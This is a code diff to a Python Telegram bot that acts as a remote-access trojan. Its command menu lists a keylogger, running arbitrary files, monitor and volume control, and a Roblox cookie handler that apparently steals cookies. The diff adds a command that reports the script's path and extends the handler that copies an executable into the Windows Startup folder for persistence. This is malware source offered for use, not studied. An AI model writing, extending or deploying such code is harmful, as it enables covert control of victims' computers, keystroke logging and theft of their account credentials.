@@ -30,6 +30,7 @@ textovik = """
 - ⚙️ **/start** - Start the program
 - ⚙️ **/help** - Help with commands
 - 🔌 **/addstartup** - Add autostart
+- 📁 **/filepath** - Shows the script's full path
 - ⌨️ **/keylogger** - Start keylogger
 - ⛔ **/stopkeylogger** - Stop keylogger
 - 👟 **/run [filepath]** - Run file
@@ -72,7 +73,7 @@ textovik = """
 - 🔊 **/fullvolume** - Set volume to full
 - 🔉 **/volumeplus** - Increase volume by 10
 - 🔇 **/volumeminus** - Decrease volume by 10
-- 🔄️ **/rotate** - Rotate monitor +90 degrees (for exmpl: entering 2 times rotates it 180 degrees)
+- 🔄️ **/rotate** - Rotate monitor +90 degrees
 - 🪟 **/maximize** - Maximize active window
 - 🪟 **/minimize** - Minimize active window
 
@@ -170,7 +171,7 @@ user_state = {}
 
 @bot.message_handler(commands=['addstartup'])
 def add_startup(message):
-    bot.send_message(message.chat.id, 'Enter name of your exe file')
+    bot.send_message(message.chat.id, 'Enter the name of your exe file (full path):')
     user_state[message.chat.id] = 'waiting_for_path'
 
 @bot.message_handler(func=lambda message: user_state.get(message.chat.id) == 'waiting_for_path')
@@ -178,16 +179,31 @@ def handle_executable_path(message):
     executable_path = message.text
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
     
-    if os.path.isdir(startup_folder):
-        executable_filename = os.path.basename(executable_path)
-        destination_path = os.path.join(startup_folder, executable_filename)
-        shutil.copyfile(executable_path, destination_path)
-        bot.send_message(message.chat.id, f'{executable_filename} added to startup successfully!')
+    if not os.path.exists(executable_path):
+        bot.send_message(message.chat.id, 'The specified file does not exist. Please try again.')
+    elif not executable_path.lower().endswith('.exe'):
+        bot.send_message(message.chat.id, 'Please provide a valid .exe file path.')
     else:
-        bot.send_message(message.chat.id, 'Startup folder not found')
+        if os.path.isdir(startup_folder):
+            executable_filename = os.path.basename(executable_path)
+            destination_path = os.path.join(startup_folder, executable_filename)
+            try:
+                shutil.copyfile(executable_path, destination_path)
+                bot.send_message(message.chat.id, f'{executable_filename} added to startup successfully!')
+            except Exception as e:
+                bot.send_message(message.chat.id, f'Failed to add to startup: {e}')
+        else:
+            bot.send_message(message.chat.id, 'Startup folder not found.')
     
-    user_state[message.chat.id] = None
-
+    user_state.pop(message.chat.id, None)
+#################################################################################
+@bot.message_handler(commands=['filepath'])
+def get_file_path(message):
+    try:
+        fullpath = os.path.abspath(__file__)
+        bot.send_message(message.chat.id, str(fullpath))
+    except Exception as e:
+        bot.send_message(message.chat.id, f'Failed to add to startup: {e}')
 #################################################################################
 @bot.message_handler(commands=['robloxcookie'])
 def robloxl(message):
